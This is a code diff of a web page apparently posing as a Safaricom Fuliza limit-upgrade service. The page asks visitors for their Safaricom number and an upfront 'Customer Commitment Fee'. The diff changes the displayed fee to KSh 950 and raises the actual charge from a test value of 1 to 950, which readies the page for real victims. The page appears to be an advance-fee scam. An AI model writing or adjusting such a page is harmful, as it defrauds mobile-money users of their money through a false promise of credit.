@@ -88,12 +88,12 @@ To finalize the upgrade, please complete the **Customer Commitment Fee** below.
 This confirms your request and allows our system to **automatically refresh your current limit to the new limit you selected.**
 </p>
 
-<div class="info">Selected Limit: <strong id="limit"></strong></div>
-<div class="info">Commitment Fee: <strong>KSh 1000</strong></div>
+<div class="info">Selected Fuliza Limit: <strong id="limit"></strong></div>
+<div class="info">Your Commitment is Fee: <strong>KSh 950</strong></div>
 
 <input type="tel" id="phone" placeholder="Enter Safaricom Number (07XXXXXXXX / 01XXXXXXXX / 2547XXXXXXXX)">
 
-<button class="pay-btn" onclick="payNow()">Pay KSh 1000 Now</button>
+<button class="pay-btn" onclick="payNow()">Pay KSh 950 Now</button>
 
 <div class="spinner" id="spinner">
 <div class="loader"></div>
@@ -113,7 +113,7 @@ Once completed, your upgraded limit will be processed immediately.
 const selectedAmount = localStorage.getItem("selectedAmount");
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 
-const commitmentFee = 1;
+const commitmentFee = 950;
 
 function isSafaricom(number){
 return /^(07|01)[0-9]{8}$/.test(number) || /^2547[0-9]{8}$/.test(number);
